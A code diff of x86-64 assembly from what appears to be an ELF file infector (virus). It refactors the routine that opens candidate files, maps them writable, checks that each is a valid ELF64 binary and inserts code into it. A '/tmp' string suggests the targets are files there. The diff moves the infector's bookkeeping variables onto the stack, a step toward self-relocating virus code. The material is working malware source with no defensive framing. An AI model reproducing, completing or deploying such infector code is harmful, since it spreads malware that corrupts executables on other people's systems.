@@ -118,20 +118,20 @@ process:                                                         ; expecting fil
                 test        rax, rax
                 jl          .return
 
-                mov         [rel infect_fd], rax
+                mov         [rsp-0x48], rax                     ; rsp-0x48 = infect_fd
 
-                lea         rsi, [rsp - 256]                    ; buf
-                mov         rdi, [rel infect_fd]
+                lea         rsi, [rsp - 0x148]                  ; rsp-0x148 = fstat buf
+                mov         rdi, [rsp-0x48]
                 mov         rax, __NR_fstat
                 syscall
                 cmp         rax, 0
                 jnz         .close
 
-                mov         rax, qword [rsp - (256-48)]         ; st_size
-                mov         [rel infect_fsize], rax
+                mov         rax, qword [rsp - (0x148-0x30)]     ; st_size
+                mov         [rsp-0x50], rax                     ; rsp-0x50 = infect_fsize
 
                 xor         r9, r9
-                mov         r8, [rel infect_fd]
+                mov         r8, [rsp-0x48]
                 mov         r10, MAP_SHARED
                 mov         rdx, PROT_READ | PROT_WRITE
                 mov         rsi, rax
@@ -141,7 +141,7 @@ process:                                                         ; expecting fil
                 cmp         rax, -4095
                 jae         .close
 
-                mov         [rel infect_mem], rax
+                mov         [rsp-0x58], rax                     ;rsp-0x58 = infect_mem
                 mov         rdi, rax
                 call        is_valid_elf64
                 cmp         rax, 1
@@ -150,12 +150,12 @@ process:                                                         ; expecting fil
                 call        insert
 
 
-.unmap:         mov         rdi, [rel infect_mem]
-                mov         rsi, [rel infect_fsize]
+.unmap:         mov         rsi, [rsp-0x50]                     ; infect_fsize
+                mov         rdi, [rsp-0x58]                     ; infect_mem
                 mov         rax, __NR_munmap
                 syscall
 
-.close:         mov         rdi, [rel infect_fd]
+.close:         mov         rdi, [rsp-0x48]
                 mov         rax, __NR_close
                 syscall
 .return:        ret
@@ -245,13 +245,6 @@ insert:                                                         ; expecting data
                 pop         r14
                 pop         r13
                 ret
-
-
-infect_fd       dq          -1
-infect_fsize    dq          -1
-infect_mem      dq          -1
-
-
 
 slash_tmp   db "/tmp",0
 pie_address dq _start
